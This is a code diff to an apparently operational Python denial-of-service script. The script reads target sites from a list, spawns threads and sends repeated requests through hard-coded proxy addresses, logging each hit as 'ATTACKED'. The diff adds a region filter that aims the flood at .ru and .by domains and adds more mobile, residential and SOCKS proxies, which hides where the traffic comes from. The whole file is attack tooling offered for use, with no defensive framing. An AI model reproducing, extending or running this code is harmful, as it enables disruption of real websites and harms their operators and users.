@@ -83,7 +83,7 @@ def check_taget(target, proxy_str):
 
     return True
 
-def mainth(protocol, ip, proxy_name):
+def mainth(protocol, ip, proxy_name, region):
     # Fetching data with proxy and targets
     with open('list.txt') as f:
         sites = f.read().splitlines()
@@ -104,6 +104,10 @@ def mainth(protocol, ip, proxy_name):
             sites.pop(index_)
             continue
 
+        if region != 'all' and not current_target.find(region):
+            sites.pop(index_)
+            continue
+
         cur_proxy = ip
         scraper.proxies.update({'http': cur_proxy,
                                 'https': cur_proxy})
@@ -118,7 +122,8 @@ def mainth(protocol, ip, proxy_name):
                 else:
                     response = scraper.get(current_target)
                 logger.info("ATTACKED; RESPONSE CODE: " +
-                            str(response.status_code) + " TARGET: " + current_target + " PROXY: " + proxy_name)
+                            str(response.status_code) + " TARGET: " + current_target + " PROXY: " + proxy_name +
+                            " | " + region)
                 if response.status_code == 404:
                     sites.pop(index_)
                     break
@@ -136,9 +141,11 @@ def cleaner():
 
 if __name__ == '__main__':
     proxies = [
-        ('http://', 'http://193.23.50.206:11335', 'mobile', ),
-        ('https://', 'http://193.23.50.164:10215', 'residental', ),
-        ('https://', 'socks5://193.23.50.164:10216', 'socks', )
+        ('http://', 'http://193.23.50.206:11335', 'mobile', '.ru', ),
+        ('https://', 'http://193.23.50.164:10215', 'residental', '.ru', ),
+        ('https://', 'socks5://193.23.50.164:10216', 'socks', '.ru', ),
+        ('http://', 'http://143.110.243.165:10815', 'mobile', '.by', ),
+        ('https://', 'http://109.248.7.93:11108', 'residental', '.by',),
     ]
     for _ in range(threads):
         Thread(target=mainth, args=choice(proxies)).start()
